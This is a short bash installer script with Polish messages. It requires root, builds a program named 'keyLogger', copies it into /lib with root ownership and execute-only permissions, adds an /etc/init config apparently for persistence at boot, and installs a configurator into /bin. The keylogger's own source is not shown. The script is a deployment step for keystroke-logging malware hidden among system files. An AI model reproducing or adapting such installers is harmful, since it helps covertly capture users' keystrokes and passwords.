#!/bin/bash

if [ "$(whoami)" != "root" ] 
then
	echo 'Brak wystarczajacych uprawnien do uruchomienia skryptu!'
	exit
fi

komenda=""

komenda=$1
shift
	case $komenda in
		"install")
		make
		cp ./keyLogger '/lib'
		sudo chown root:root '/lib/keyLogger'
		sudo chmod 100 '/lib/keyLogger'
		cp ./ninja/ninja.conf  '/etc/init'
		cp ./configurator/keylogger_config.sh '/bin'
		mv  '/bin/keylogger_config.sh' '/bin/keylogger_config'
		sudo chown root:root '/bin/keylogger_config'
		sudo chmod 100 '/bin/keylogger_config'
		
	;;
esac

